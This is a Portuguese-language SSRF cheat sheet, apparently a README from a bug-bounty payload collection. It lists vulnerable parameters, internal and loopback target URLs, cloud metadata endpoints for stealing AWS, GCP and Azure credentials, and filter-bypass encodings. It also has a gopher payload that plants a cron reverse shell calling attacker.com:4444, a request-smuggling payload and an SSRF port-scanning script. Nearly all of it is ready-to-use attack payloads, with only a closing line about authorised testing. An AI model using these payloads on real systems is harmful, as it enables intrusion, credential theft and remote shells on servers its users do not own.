# 🌐 SSRF — falsificação de pedidos pelo servidor

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de contexto:** os exemplos AWS usam IMDSv1; quando a instância exige IMDSv2, é necessário obter um token de sessão e enviá-lo no pedido de metadados. [Documentação AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html). Os esquemas de URL e os endereços alternativos só funcionam se forem aceites pelo cliente HTTP, pelo processador de URLs e pela configuração de rede. Usar HTTP numa porta normalmente associada a outro serviço não muda automaticamente o protocolo. Os exemplos Gopher/Redis são ilustrativos e dependem da configuração e das permissões do serviço; as classificações de impacto exigem confirmação no contexto testado.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Falsificação de pedidos pelo servidor
```

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 🎯 O que é SSRF

Uma vulnerabilidade **SSRF** permite que um atacante leve o servidor a enviar pedidos para destinos não previstos, podendo aceder a serviços internos ou a metadados da nuvem.

### Impacto
- 🔴 **Acesso à rede interna** — Analisar serviços internos
- 🔴 **Metadados da nuvem** — Roubar credenciais AWS/GCP
- 🔴 **Contorno de firewalls** — Aceder a recursos protegidos
- 🔴 **RCE** — Em alguns casos, permite a execução de código

---

## 🔍 Onde procurar

### Parâmetros comuns
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

### Funcionalidades frequentemente vulneráveis
```
- Ferramentas de obtenção e validação de URLs
- Geradores de PDF
- Processadores de imagens
- Importações de ficheiros
- Webhooks
- Integrações de API
- Ferramentas de extração de dados da Web (web scrapers)
- Serviços de captura de ecrã
```

---

## 💉 Payloads básicos

### Localhost (o próprio sistema)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

### Redes internas
```
# Classe A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# Classe B
http://172.16.0.1
http://172.31.255.255

# Classe C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# Endereço de ligação local (link-local)
http://169.254.169.254
```

### Portas comuns
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # HTTP alternativo
http://127.0.0.1:9200  # Elasticsearch
```

---

## ☁️ Metadados da nuvem

### AWS
```
# Metadados da instância (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Dados específicos
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

### Google Cloud (GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Com o cabeçalho obrigatório
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# Exige um cabeçalho
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

## 🛡️ Técnicas de contorno

### Formatos de endereços IP
```
# Decimal
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# Hexadecimal
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# Octal
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# Misto
http://127.1
http://127.0.1
http://0
```

### Codificação de URLs
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# Codificação dupla
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

### DNS rebinding (alteração da resolução DNS entre pedidos)
```
# Utilizar serviços como:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# Configurar DNS personalizado
your-domain.com → 127.0.0.1
```

### Problemas de interpretação de URLs
```
# Técnica com @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# Fragmentos
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# Barra invertida
http://attacker.com\127.0.0.1
```

### Introdução de protocolos inesperados (protocol smuggling)
```
# Ficheiro
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

### Encadeamento com um redirecionamento aberto
```
# Se o site tiver um redirecionamento aberto:
https://target.com/redirect?url=http://169.254.169.254/

# Redirecionar para um destino interno
http://target.com/redirect?url=http://127.0.0.1:8080
```

### Contornar validações com IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

### Injeção de cabeçalhos
```
# Injeção de CRLF no URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

## 🔥 Exploração

### Execução remota de código no Redis através de Gopher
```
# Gerar o payload
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### Introdução de pedidos HTTP não previstos (request smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

### Análise de portas
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

---

## 📊 Referência rápida

### Deteção
```
# Testar a existência de SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# Verificar a resposta
- Foi recebida uma consulta DNS?
- Foi recebido um pedido HTTP?
- A resposta difere para IPs internos?
```

### Níveis de impacto

| Alvo | Impacto |
|--------|--------|
| Metadados da nuvem | Crítico — Roubo de credenciais |
| APIs internas | Elevado — Acesso a dados |
| Serviços internos | Elevado — Potencial execução remota de código |
| Análise de portas | Médio — Divulgação de informação |

### Filtros comuns e formas de os contornar

| Filtro | Forma de contorno |
|--------|--------|
| Bloqueio de `localhost` | Utilizar `127.0.0.1`, `0`, `[::1]` |
| Bloqueio de `127.0.0.1` | Utilizar a representação decimal `2130706433` |
| Bloqueio de IPs privados | Utilizar DNS rebinding |
| Apenas HTTP | Experimentar `gopher://`, `file://` |
| Lista de domínios permitidos | Utilizar o símbolo `@` ou um redirecionamento aberto |

---

## 🛠️ Ferramentas

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (gerador de payloads Gopher)
python gopherus.py --exploit redis

# Collaborator ou webhook para SSRF cego
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

## 📚 Recursos

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 Explore vulnerabilidades SSRF!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
